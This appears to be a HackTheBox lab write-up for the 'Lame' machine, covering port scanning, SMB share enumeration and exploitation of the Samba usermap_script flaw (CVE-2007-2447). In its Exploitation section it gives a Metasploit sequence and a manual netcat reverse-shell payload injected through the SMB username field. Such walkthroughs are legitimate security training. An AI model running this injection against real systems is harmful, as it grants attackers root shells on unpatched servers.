# Lame — HackTheBox

**Difficulty:** Easy &nbsp;|&nbsp; **OS:** Linux &nbsp;|&nbsp; **Points:** 20

One of the oldest machines on HackTheBox and a great intro to exploiting unpatched services. A vulnerable Samba version gives a direct root shell — no privilege escalation needed.

<!-- more -->

---

## Recon

```bash
nmap -sV -sC -p- --min-rate 5000 -oN lame.txt 10.10.10.3
```

```
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 2.3.4
22/tcp  open  ssh     OpenSSH 4.7p1
139/tcp open  netbios-ssn Samba smbd 3.X
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian
```

Two things jump out immediately:
- `vsftpd 2.3.4` — infamous backdoor (CVE-2011-2523)  
- `Samba 3.0.20` — vulnerable to CVE-2007-2447

## Enumeration

### FTP — vsftpd 2.3.4

```bash
searchsploit vsftpd 2.3.4
```

The backdoor exploit exists but the port it opens (6200) was filtered on this machine. Dead end.

### SMB — Samba 3.0.20

```bash
smbclient -L //10.10.10.3 -N
```

```
Sharename    Type   Comment
---------    ----   -------
print$       Disk   Printer Drivers
tmp          Disk   oh noes!
opt          Disk
IPC$         IPC    IPC Service
ADMIN$       IPC    IPC Service
```

`tmp` share is accessible anonymously. The Samba version is 3.0.20 — vulnerable to CVE-2007-2447, a username map script injection.

## Exploitation

### CVE-2007-2447 — Samba usermap_script

The vulnerability is in the `username map script` option in `smb.conf`. When set, Samba passes the username through a shell command without sanitisation, allowing command injection via the username field.

```bash
searchsploit samba 3.0.20
```

```
Samba 3.0.20 < 3.0.25rc3 - 'Username Map Script' Command Execution (Metasploit)
```

=== "Metasploit"

    ```bash
    msfconsole -q
    use exploit/multi/samba/usermap_script
    set RHOSTS 10.10.10.3
    set LHOST 10.10.x.x
    run
    ```

=== "Manual"

    ```bash
    # Set up listener
    nc -lvnp 4444

    # Inject via SMB login — payload in username field
    smbclient //10.10.10.3/tmp -N --option='client min protocol=NT1'
    smb: \> logon "/=`nohup nc -e /bin/sh 10.10.x.x 4444`"
    ```

!!! success "Root shell — no privesc needed"
    The Samba service runs as root. Immediate root access.

## Key Takeaways

- Always run a full port scan — services on non-standard ports matter
- Old CVEs on unpatched services are often instant root
- Check what user a service runs as — services running as root mean no privesc needed
- `vsftpd 2.3.4` is a famous rabbit hole on this box — the backdoor port is filtered
